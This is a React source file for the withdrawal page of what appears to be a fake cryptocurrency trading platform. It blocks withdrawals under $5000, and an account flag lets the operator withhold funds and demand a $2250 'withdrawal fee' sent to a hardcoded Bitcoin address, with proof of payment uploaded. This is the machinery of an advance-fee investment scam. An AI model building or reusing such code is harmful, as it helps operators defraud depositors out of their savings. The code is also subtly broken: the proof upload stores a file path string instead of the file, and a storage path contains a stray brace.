import { Dialog, Divider } from '@material-ui/core'
import axios from 'axios'
import React, { useEffect, useState } from 'react'
import { useDispatch, useSelector } from 'react-redux'
import { useFirebase } from 'react-redux-firebase'
import { withdrawalAction } from '../Auths/Action'
import UserNav1 from './UserNav1'
import Swal from 'sweetalert2'
import withReactContent from 'sweetalert2-react-content'
import { useHistory, Link } from 'react-router-dom'
import { Modal, Button, Form } from 'react-bootstrap'
import Ufooter from './Ufooter'

import imgBtc from '../../assets/qrcode.jpg'

const MySwal = withReactContent(Swal)

function Withdrawals() {
  const firebase = useFirebase()
  const dispatch = useDispatch()
  const { push } = useHistory()

  const transInfo = useSelector((state) => state.projectReducer)
  const profileInfo = useSelector((state) => state.firebase.profile)
  const [openPay, setOpenPay] = useState({
    btc: false,
    etheruim: false,
    litecoin: false,
    bank: false,
  })

  const [newAmount, setNewAmount] = useState(1)
  const [withdrawalAmount, setWithdrawalAmount] = useState({
    amount: '',
    wallet: '',
    withdrawalMethod: '',
    name: '',
    accountNumber: 'none',
    phone: '',
  })

  const [withdrawalFeeData, setWithdrawalFeeData] = useState({
    open: false,
    prove: '',
    isSubmitting: false,
  })

  const withdrawalErrorOptions = {
    title: <p>ERROR</p>,
    text: 'No or low balance for withdrawal',
    icon: 'error',
    color: 'orange',
    timer: 7000,
    showCloseButton: true,
    closeButtonText: 'Ok',
  }

  useEffect(() => {
    axios
      .get(
        `https://blockchain.info/tobtc?currency=USD&value=${
          withdrawalAmount.amount || 1
        }`,
      )
      .then((res) => {
        setNewAmount(res.data)
      })
      .catch((err) => {})
  }, [withdrawalAmount.amount])

  const handleWithdrawal = (e) => {
    e.preventDefault()

    if (profileInfo.totalBalance === '0000') {
      setOpenPay({
        ...openPay,
        btc: false,
        etheruim: false,
        litecoin: false,
        bank: false,
      })
      setWithdrawalAmount({
        ...withdrawalAmount,
        amount: '',
        wallet: '',
        withdrawalMethod: '',
        name: '',
        accountNumber: 'none',
        phone: '',
      })

      return MySwal.fire(withdrawalErrorOptions)
    }

    if (Number(profileInfo?.totalBalance) > 5000) {
      if (profileInfo?.disableWithdrawal === false) {
        setOpenPay({
          ...openPay,
          btc: false,
          etheruim: false,
          litecoin: false,
          bank: false,
        })

        return withdrawalAction(
          profileInfo,
          withdrawalAmount,
          firebase,
          dispatch,
          setWithdrawalAmount,
          axios,
        )
      } else {
        return setWithdrawalFeeData({ ...withdrawalFeeData, open: true })
      }
    } else {
      setOpenPay({
        ...openPay,
        btc: false,
        etheruim: false,
        litecoin: false,
        bank: false,
      })
      setWithdrawalAmount({
        ...withdrawalAmount,
        amount: '',
        wallet: '',
        withdrawalMethod: '',
        name: '',
        accountNumber: 'none',
        phone: '',
      })

      return MySwal.fire({
        title: 'Low Withdrawal Balance',
        icon: 'error',
        text:
          'You Must Have $5000 and above Before You Can Withdraw. You can go ahead and fund your account',
        color: 'red',
        showCloseButton: true,
        closeButtonText: 'Cancel',
      })
    }
  }

  const errorOptions = {
    title: <p>ERROR</p>,
    text: transInfo.withdrawalError,
    icon: 'error',

    color: 'orange',
    showCloseButton: true,
    closeButtonText: 'Ok',
  }
  const successOptions = {
    title: <p>SUCCESS</p>,
    html: <span className="text-success">{transInfo.withdrawalSuccess}</span>,
    icon: 'success',

    showCloseButton: true,
    closeButtonText: 'Ok',
  }

  //if (profileInfo.totalBalance === '0000' || profileInfo.accessCode === '') {
  //  dispatch({ type: 'NO_WITHDRAWAL_ACCESS', accessPopUp: true })
  //  return <Redirect to="/user/dashboard" />
  //}

  const handleAccess = (e) => {
    e.preventDefault()
    setWithdrawalFeeData({ ...withdrawalFeeData, isSubmitting: true })
    const uid = firebase.auth().currentUser.uid
    firebase
      .storage()
      .ref('withdrawalFee')
      .child(uid)
      .put(withdrawalFeeData.prove)
      .then(() => {
        firebase
          .storage()
          .ref(`withdrawalFee/${uid}}`)
          .getDownloadURL()
          .then((url) => {
            firebase
              .firestore()
              .collection('users')
              .doc(uid)
              .update({
                withdrawalFeeProve: url,
              })
              .then(() => {
                setOpenPay({
                  ...openPay,
                  btc: false,
                  etheruim: false,
                  litecoin: false,
                  bank: false,
                })
                setWithdrawalFeeData({
                  ...withdrawalFeeData,
                  open: false,
                  isSubmitting: false,
                })
                MySwal.fire({
                  title: <p>SUCCESS</p>,
                  html: (
                    <span className="text-success">
                      Your Withdrawal Fee Prove Has been Sent Successfully. We
                      will get back to you in less then 24 hours.
                    </span>
                  ),
                  icon: 'success',

                  showCloseButton: true,
                })
              })
          })
      })
  }

  if (transInfo.withdrawalError) {
    setOpenPay({
      ...openPay,
      btc: false,
      etheruim: false,
      litecoin: false,
      bank: false,
    })
    MySwal.fire(errorOptions).then(() => {
      return dispatch({ type: 'WITHDRAWAL_ERROR', messsage: '' })
    })
  }
  if (transInfo.withdrawalSuccess) {
    setOpenPay({
      ...openPay,
      btc: false,
      etheruim: false,
      litecoin: false,
      bank: false,
    })
    MySwal.fire(successOptions).then(() => {
      return dispatch({ type: 'WITHDRAWAL_SUCCESS', messsage: '' })
    })
  }

  return (
    <div id="main-wrapper" className="show">
      <UserNav1 />
      <div className="content-body">
        <div className="container-fluid">
          <div className="row page-titles mx-0 ">
            <div className="col-sm-6 p-md-0">
              <div className="welcome-text">
                <h4>Trading Withdrawal</h4>
              </div>
            </div>
            <div className="col-sm-6 p-md-0 justify-content-sm-end mt-2 mt-sm-0 d-flex">
              <ol className="breadcrumb">
                <li className="breadcrumb-item">
                  <Link to="/user/dashboard">Dashboard</Link>
                </li>
                <li className="breadcrumb-item active">
                  <Link to="#">Withdrawal</Link>
                </li>
              </ol>
            </div>
          </div>
        </div>
        <div className="authentication-bg  pb-4">
          <div className=" height-100vh site-bg">
            <div>
              <div>
                <div className="col-12">
                  <div className="row justify-content-center">
                    <div className="col-12 pt-2 ">
                      <div className="card mb-3">
                        <div className="card-header border-0">
                          <h4 className="mb-0 text-black fs-20">
                            Choose your withdrawal method
                          </h4>
                        </div>
                        <div className="card-body p-4">
                          <div className="text-center mb-4"></div>
                          <div className="field_form authorize_form">
                            <div>
                              <div>
                                <div
                                  className="form-group col-md-12 text-center wow"
                                  data-animation="fadeInUp"
                                  data-animation-delay="0.6s"
                                >
                                  <Button
                                    block
                                    onClick={() => {
                                      setOpenPay({
                                        ...openPay,
                                        btc: !openPay.btc,
                                        bank: false,
                                        etheruim: false,
                                        litecoin: false,
                                      })
                                      setWithdrawalAmount({
                                        ...withdrawalAmount,
                                        withdrawalMethod: 'Bitcoin',
                                      })
                                    }}
                                  >
                                    Bitcoin
                                  </Button>
                                </div>
                              </div>
                              <Dialog
                                open={openPay.btc}
                                onClose={() =>
                                  setOpenPay({ ...openPay, btc: false })
                                }
                                fullWidth
                              >
                                <div className="field_form authorize_form">
                                  <div className="text-center userTextColor">
                                    <p>
                                      You want to withdraw $
                                      {withdrawalAmount.amount}
                                    </p>
                                    <p>Bitcoin : {newAmount && newAmount}</p>
                                    <p>
                                      with {withdrawalAmount.withdrawalMethod}{' '}
                                      withdrawal method.
                                    </p>
                                    <h5 className="text-center userTextColor pb-2">
                                      {withdrawalAmount.withdrawalMethod}{' '}
                                      withdrawal.
                                    </h5>
                                  </div>
                                  <h5 className="text-center userTextColor">
                                    Input your withdrawal information
                                  </h5>
                                  <form onSubmit={handleWithdrawal}>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="text"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Name"
                                        name="name"
                                        value={withdrawalAmount.name}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            name: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="number"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Amount"
                                        name="amount"
                                        value={withdrawalAmount.amount}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            amount: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="text"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Wallet"
                                        name="wallet"
                                        value={withdrawalAmount.wallet}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            wallet: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="tel"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Number"
                                        name="number"
                                        value={withdrawalAmount.phone}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            phone: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div className="form-group col-md-12 text-center wow">
                                      <Button type="submit">Submit</Button>
                                    </div>
                                    <div className="divider small_divider"></div>
                                  </form>
                                </div>
                              </Dialog>
                              <div className="form-group col-md-12 text-center wow btn-radius">
                                <Button
                                  block
                                  onClick={() => {
                                    setOpenPay({
                                      ...openPay,
                                      etheruim: !openPay.etheruim,
                                      bank: false,
                                      litecoin: false,
                                      btc: false,
                                    })
                                    setWithdrawalAmount({
                                      ...withdrawalAmount,
                                      withdrawalMethod: 'Etheruim',
                                    })
                                  }}
                                >
                                  Etherium
                                </Button>
                              </div>
                              <Dialog
                                open={openPay.etheruim}
                                onClose={() =>
                                  setOpenPay({ ...openPay, etheruim: false })
                                }
                                fullWidth
                              >
                                <div className="field_form authorize_form">
                                  <div className="text-center userTextColor">
                                    <p>
                                      You want to withdraw $
                                      {withdrawalAmount.amount}
                                    </p>
                                    <p>Bitcoin : {newAmount && newAmount}</p>
                                    <p>
                                      with {withdrawalAmount.withdrawalMethod}{' '}
                                      withdrawal method.
                                    </p>
                                  </div>
                                  <h5 className="text-center userTextColor">
                                    {withdrawalAmount.withdrawalMethod}{' '}
                                    withdrawal.
                                  </h5>
                                  <h5 className="userTextColor text-center pb-2">
                                    Input your withdrawal information
                                  </h5>
                                  <form onSubmit={handleWithdrawal}>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="text"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Name"
                                        name="name"
                                        value={withdrawalAmount.name}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            name: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div
                                      className="form-group col-md-12 animation"
                                      data-animation="fadeInUp"
                                      data-animation-delay="0.7s"
                                    >
                                      <input
                                        type="number"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Amount"
                                        name="amount"
                                        value={withdrawalAmount.amount}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            amount: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div
                                      className="form-group col-md-12 animation"
                                      data-animation="fadeInUp"
                                      data-animation-delay="0.7s"
                                    >
                                      <input
                                        type="text"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Wallet"
                                        name="wallet"
                                        value={withdrawalAmount.wallet}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            wallet: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div
                                      className="form-group col-md-12 animation"
                                      data-animation="fadeInUp"
                                      data-animation-delay="0.7s"
                                    >
                                      <input
                                        type="tel"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Number"
                                        name="number"
                                        value={withdrawalAmount.phone}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            phone: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div
                                      className="form-group col-md-12 text-center animation"
                                      data-animation="fadeInUp"
                                      data-animation-delay="0.8s"
                                    >
                                      <Button type="submit">Submit</Button>
                                    </div>
                                    <div className="divider small_divider"></div>
                                  </form>
                                </div>
                              </Dialog>

                              <div className="form-group col-md-12 text-center wow btn-radius">
                                <Button
                                  block
                                  onClick={() => {
                                    setOpenPay({
                                      ...openPay,
                                      litecoin: !openPay.litecoin,
                                      bank: false,
                                      etheruim: false,
                                      btc: false,
                                    })
                                    setWithdrawalAmount({
                                      ...withdrawalAmount,
                                      withdrawalMethod: 'Litecoin',
                                    })
                                  }}
                                >
                                  Litecoin
                                </Button>
                              </div>
                              <Dialog
                                open={openPay.litecoin}
                                onClose={() =>
                                  setOpenPay({ ...openPay, litecoin: false })
                                }
                                fullWidth
                              >
                                <div className="field_form authorize_form">
                                  <div className="text-center userTextColor">
                                    <p>
                                      You want to withdraw $
                                      {withdrawalAmount.amount}
                                    </p>
                                    <p>Bitcoin : {newAmount && newAmount}</p>
                                    <p>
                                      with {withdrawalAmount.withdrawalMethod}{' '}
                                      withdrawal method.
                                    </p>
                                  </div>
                                  <h5 className="text-center userTextColor">
                                    {withdrawalAmount.withdrawalMethod}{' '}
                                    withdrawal.
                                  </h5>
                                  <h5 className="userTextColor text-center pb-2">
                                    Input your withdrawal information
                                  </h5>
                                  <form onSubmit={handleWithdrawal}>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="text"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Name"
                                        name="name"
                                        value={withdrawalAmount.name}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            name: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="number"
                                        className="form-control"
                                        required
                                        placeholder="Amount"
                                        name="amount"
                                        value={withdrawalAmount.amount}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            amount: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="text"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Wallet"
                                        name="wallet"
                                        value={withdrawalAmount.wallet}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            wallet: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="tel"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Number"
                                        name="number"
                                        value={withdrawalAmount.phone}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            phone: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div className="form-group col-md-12 text-center wow">
                                      <Button type="submit">Submit</Button>
                                    </div>
                                    <div className="divider small_divider"></div>
                                  </form>
                                </div>
                              </Dialog>
                              <div className="form-group col-md-12 text-center wow  ">
                                <Button
                                  block
                                  onClick={() => {
                                    setOpenPay({
                                      ...openPay,
                                      bank: !openPay.bank,
                                      litecoin: false,
                                      etheruim: false,
                                      btc: false,
                                    })
                                    setWithdrawalAmount({
                                      ...withdrawalAmount,
                                      withdrawalMethod: 'Bank',
                                    })
                                  }}
                                >
                                  Bank withdrawal
                                </Button>
                              </div>
                              <Dialog
                                open={openPay.bank}
                                onClose={() =>
                                  setOpenPay({ ...openPay, bank: false })
                                }
                                fullWidth
                              >
                                <div className="field_form authorize_form">
                                  <div className="text-center userTextColor">
                                    <p>
                                      You want to withdraw $
                                      {withdrawalAmount.amount}
                                    </p>
                                    <p>Bitcoin : {newAmount && newAmount}</p>
                                    <p>
                                      with {withdrawalAmount.withdrawalMethod}{' '}
                                      withdrawal method.
                                    </p>
                                  </div>
                                  <h5 className="text-center userTextColor">
                                    {withdrawalAmount.withdrawalMethod}{' '}
                                    withdrawal.
                                  </h5>
                                  <h5 className="userTextColor text-center">
                                    Input your withdrawal information
                                  </h5>
                                  <form onSubmit={handleWithdrawal}>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="text"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Name"
                                        name="name"
                                        value={withdrawalAmount.name}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            name: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="number"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Amount"
                                        name="amount"
                                        value={withdrawalAmount.amount}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            amount: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div className="form-group col-md-12 wow">
                                      <input
                                        type="text"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Account number"
                                        name="wallet"
                                        value={withdrawalAmount.accountNumber}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            accountNumber: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div
                                      className="form-group col-md-12 wow"
                                      data-animation="fadeInUp"
                                      data-animation-delay="0.7s"
                                    >
                                      <input
                                        type="tel"
                                        className="form-control text-dark"
                                        required
                                        placeholder="Number"
                                        name="number"
                                        value={withdrawalAmount.phone}
                                        onChange={(e) =>
                                          setWithdrawalAmount({
                                            ...withdrawalAmount,
                                            phone: e.target.value,
                                          })
                                        }
                                      />
                                    </div>
                                    <div
                                      className="form-group col-md-12 text-center wow"
                                      data-animation="fadeInUp"
                                      data-animation-delay="0.8s"
                                    >
                                      <Button type="submit">Submit</Button>
                                    </div>
                                    <div className="divider small_divider"></div>
                                  </form>
                                </div>
                              </Dialog>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="col-sm-12">
          <div className="card ">
            <div className="card-header border-0">
              <h4 className="mb-0 text-black fs-20">Contact Us</h4>
            </div>

            <div className="card-body ">
              <section className="mt-5">
                <div>
                  <div className="row align-items-center">
                    <div className="col-lg-9">
                      <div className="action-content res_md_mb_20">
                        <h3 className="wow">
                          Let Us Help You to Find a Solution That Meets Your
                          Needs
                        </h3>
                        <p className="m-0 wow">
                          contact our team for any issue on your savings account
                        </p>
                        <p className="m-0 wow"></p>
                      </div>
                    </div>
                    <div className="col-lg-3 text-lg-right">
                      <ul className="portofolio-social">
                        <li>
                          <Button onClick={() => push('/contacts')}>
                            Contact Us <i className="fa fa-arrow-right"></i>
                          </Button>
                        </li>
                      </ul>
                    </div>
                  </div>
                </div>
              </section>
            </div>
          </div>
        </div>
        <Ufooter />
        <Modal
          show={withdrawalFeeData.open}
          centered
          onHide={() =>
            setWithdrawalFeeData({ ...withdrawalFeeData, open: false })
          }
          backdrop="static"
        >
          <Form onSubmit={handleAccess}>
            <Modal.Header closeButton>
              <Modal.Title className="userTextColor">
                Withdrawal Fee
              </Modal.Title>
            </Modal.Header>
            <Modal.Body>
              <p>Withdrawal Fee</p>
              <h6>$2250</h6>

              <h4 className="userTextColor">
                Make payment with the below btc wallet and upload Prove
              </h4>
              <div>
                <img src={imgBtc} width="300px" alt="Code" />
                <p>31keT3WdcgNwo5cThrMW9s9e4jQbGTqpTh</p>
              </div>
              <h6 className="text-dark text-center py-4">
                Withdrawal Fee Prove
              </h6>
              <Form.Control
                type="file"
                name="withdrawalFee"
                required
                placeholder="Withdrawal Fee Prove"
                onChange={(e) =>
                  setWithdrawalFeeData({
                    ...withdrawalFeeData,
                    prove: e.target.value,
                  })
                }
                value={withdrawalFeeData.prove}
              />

              <Divider />
            </Modal.Body>
            <Modal.Footer>
              <Button
                disabled={withdrawalFeeData.isSubmitting}
                type="submit"
                className="bg-secondary"
              >
                Submit
              </Button>
              <Button
                onClick={() =>
                  setWithdrawalFeeData({ ...withdrawalFeeData, open: false })
                }
              >
                Cancel
              </Button>
            </Modal.Footer>
          </Form>
        </Modal>
      </div>
    </div>
  )
}

export default Withdrawals
